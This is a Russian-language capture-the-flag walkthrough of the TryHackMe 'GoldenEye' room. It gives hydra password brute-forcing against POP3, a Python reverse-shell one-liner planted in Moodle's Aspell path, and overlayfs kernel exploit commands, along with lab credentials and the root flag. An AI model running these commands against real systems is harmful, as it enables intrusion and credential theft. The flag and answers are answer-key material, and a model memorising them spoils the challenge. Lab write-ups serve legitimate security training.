[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [GoldenEye](https://tryhackme.com/r/room/goldeneye) 

Всего 4 задания:
## Задание 1
В этой комнате вам предстоит пройти испытание по взлому ящика в стиле Джеймса Бонда и получить права root.

Спасибо  creosote за создание этой виртуальной машины.  Эта машина используется здесь с явного разрешения создателя <3

Итак... Начнем!

### Ответьте на вопросы ниже
Первым делом подключитесь к нашей сети и запустите машину.
```commandline
Ответ не нужен
```
Используйте nmap для сканирования сети на предмет всех портов. Сколько портов открыто?
```commandline
nmap -p- -Pn <ip>
```
```commandline
4
```
Загляните на сайт, изучите исходный код и не забудьте проверить все скрипты!
```commandline
cat terminal.js
```
```commandline
Ответ не нужен
```
Кому нужно обновлять свой пароль по умолчанию?
```commandline
boris
```
Какой у них пароль?
```commandline
https://gchq.github.io/CyberChef/
from HTML entity
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```
```commandline
InvincibleHack3r
```
Теперь используйте эти учетные данные и войдите в часть сайта.
```commandline
curl -s --user boris:InvincibleHack3r http://<IP>/sev-home/index.html | tail
```
```commandline
Ответ не нужен
```

## Задание 2
Перейдем к следующим шагам. 

### Ответьте на вопросы ниже
Взгляните на некоторые другие сервисы, которые вы нашли с помощью сканирования nmap. Можно ли повторно использовать 
имеющиеся у вас учетные данные?
```commandline
Ответ не нужен
```
Если эти учетные данные не работают, можно ли использовать другую программу для поиска других пользователей и 
паролей? Может быть, Hydra? Какой у них новый пароль?
```commandline
hydra -l natalya -P /data/src/wordlists/fasttrack.txt pop3://<IP>:55007
# login: natalya   password: bird
hydra -l boris -P /data/src/wordlists/fasttrack.txt pop3://10.10.7.77:55007
login: boris   password: secret1
```
```commandline
secret1!
```
Проверьте порт 55007, какие службы настроены на использование этого порта?
```commandline
telnet <IP> 55007
natalya:bird
```
```commandline
telnet
```
Войдите в систему, используя эту службу и учетные данные, которые вы нашли ранее.
```commandline
Ответ не нужен
```
Что вы можете найти на этом сервисе?
```commandline
LIST
```
```commandline
emails
```
Какой пользователь может взломать коды Бориса?
```commandline
RETR 1
RETR 2
```
```commandline
natalya
```
Используя пользователей, которых вы нашли на этом сервисе, найдите пароли других пользователей.
```commandline
RETR 2
username: xenia password: RCP90rulez!
```
```commandline
Ответ не нужен
```
Продолжайте подсчитывать пользователей, использующих этот сервис, и продолжайте попытки получить их пароли с помощью 
атак по словарю.
```commandline
Ответ не нужен
```

## Задание 3
Перечисление действительно имеет ключевое значение. Создание заметок и обращение к ним может спасти жизнь. Теперь 
перейдем к получению оболочки пользователя.

### Ответьте на вопросы ниже
Если вы помните, в некоторых из обнаруженных вами писем есть сайт severnaya-station.com. Чтобы это заработало, вам 
нужно обновить записи DNS, чтобы раскрыть его.

Если вы используете Linux, отредактируйте файл «/etc/hosts» и добавьте:

`<машины ip> severnaya-station.com`

Если у вас Windows, сделайте то же самое, но в файле `c:\Windows\System32\Drivers\etc\hosts`
```commandline
Ответ не нужен
```
После этого перейдите в браузере по адресу: http://severnaya-station.com/gnocertdir
```commandline
Ответ не нужен
```
Попробуйте использовать учетные данные, которые вы нашли ранее. Какому пользователю вы можете войти?
```commandline
xenia
```
Пошарьте по сайту. Какого еще пользователя вы можете найти?
```commandline
doak
```
Какой пароль у этого пользователя?
```commandline
hydra -l doak -P /data/src/wordlists/fasttrack.txt pop3://<IP>:55007
```
```commandline
goat
```
Используйте учетные данные этого пользователя, чтобы просмотреть все найденные вами сервисы и получить доступ к 
большему количеству адресов электронной почты.
```commandline
telnet <IP> 55007
doak:goat
```
```commandline
Ответ не нужен
```
Какого следующего пользователя вы можете найти в doak?
```commandline
RETR 1
username: dr_doak password: 4England!
```
```commandline
dr_doak
```
Какой пароль у этого пользователя?
```commandline
4England!
```
Взгляните на их файлы на moodle ( severnaya-station.com)
```commandline
# My profile > My private files
cat s3cret.txt 
```
```commandline
Ответ не нужен
```
Загрузите вложения и посмотрите, есть ли внутри них скрытые сообщения?
```commandline
wget http://10.10.7.77/dir007key/for-007.jpg
exiftool for-007.jpg
echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```
```commandline
Ответ не нужен
```
Используя информацию, которую вы нашли в предыдущем задании, войдите в систему под именем вновь найденного пользователя.
```commandline
Ответ не нужен
```
Поскольку у этого пользователя больше привилегий на сайте, вы можете редактировать настройки moodles. Отсюда 
получите обратную оболочку с помощью python и netcat. 

Ознакомьтесь с Aspell, плагином для проверки орфографии.
```commandline
rlwrap nc -nlvp 4444
Settings->Aspell->Path to aspell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<MY_OWN_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
Navigation > My profile > Blog > Add a new entry and clik on the “Toggle spell checker”
```
```commandline
Ответ не нужен
```

## Задание 4
Теперь, когда вы перечислили достаточно, чтобы получить административный вход в Moodle и получить обратную оболочку, 
пришло время приватизировать ESC.

### Ответьте на вопросы ниже
Загрузите linuxprivchecker для просмотра списка установленных инструментов разработки.

Чтобы загрузить файл на машину, вам понадобится wget на вашей локальной машине, так как виртуальная машина не сможет загрузить файлы в Интернете. Выполните следующие шаги, чтобы загрузить файл на вашу виртуальную машину:

Загрузите файл linuxprivchecker локально
Перейдите к файлу в вашей файловой системе.
Выполните: `python -m SimpleHTTPServer 1337 (оставьте это запущенным)`
На виртуальной машине теперь можно выполнить: `wget <ваш IP>/<файл>.py`
ИЛИ

Перечислите машины вручную.
```commandline
Ответ не нужен
```
Какая версия ядра?
```commandline
uname -a
```
```commandline
3.13.0-32-generic
```
Эта машина уязвима для эксплойта overlayfs. Эксплуатация технически очень проста:
- Создайте нового пользователя и смонтируйте пространство имен, используя клонирование с флагами 
CLONE_NEWUSER|CLONE_NEWNS.
- Смонтируйте overlayfs, используя /bin в качестве нижней файловой системы, несколько временных каталогов в качестве 
  верхней и рабочий каталог.
- Монтирование Overlayfs будет видно только в пределах пространства имен пользователя, поэтому позвольте процессу 
  пространства имен изменить CWD на overlayfs, тем самым сделав overlayfs видимым также за пределами пространства имен через файловую систему proc.
- Сделать su в мире overlayfs доступным для записи без смены владельца
- Позвольте процессу вне пространства имен пользователя записать произвольное содержимое в файл, применив слегка 
  измененный вариант эксплойта SetgidDirectoryPrivilegeEscalation.
- Запустить измененный двоичный файл su


Вы можете загрузить эксплойт здесь: https://www.exploit-db.com/exploits/37292
```commandline
Ответ не нужен
```
Исправьте эксплойт, чтобы он работал с системой, которую вы пытаетесь эксплойтить. Помните, перечисление — ваш ключ!

Какие средства разработки установлены на машине?
```commandline
Ответ не нужен
```
Что такое корневой флаг?
```commandline
searchsploit kernel 3.13 overlayfs
searchsploit -m 37292
gcc 37292.c -o exploit
which cc
sed -i "s/gcc/cc/g" 37292.c
cc 37292.c -o exploit
./exploit
id
cd /root
ls -la
cat .flag.txt
```
```commandline
568628e0d993b1973adc718237da6e93
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)